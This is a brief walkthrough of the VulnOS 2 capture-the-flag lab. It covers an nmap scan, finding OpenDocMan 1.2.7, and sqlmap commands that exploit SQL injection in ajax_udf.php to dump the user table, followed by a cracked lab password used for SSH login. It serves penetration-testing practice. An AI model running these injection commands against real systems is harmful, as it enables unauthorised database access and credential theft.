<h1>VulnOS: 2 Write-up</h1>

<h2>Nmap</h2>

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
6667/tcp open  irc     ngircd
```
<h3>PORT 80</h3>

on http://192.168.56.104/jabc/?q=node/7

Press CTRL+A  to see the hidden content 

on : http://192.168.56.104/jabcd0cs/ **OpenDocMan 1.2.7** is running 

<h2>Exploiting</h2>

<h3>sql injection :</h3>

Exploit : https://www.exploit-db.com/exploits/32075

```
sqlmap --url "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user*" --dbs --level=5 --risk=3
sqlmap --url "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user*" -D jabcd0cs -T odm_user --dump
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/VulnOS%3A%202/Images/sqlmap.png)

```
username : **webmin**
decrypt md5 password :  **webmin1980**
```

Login ssh using this creds 




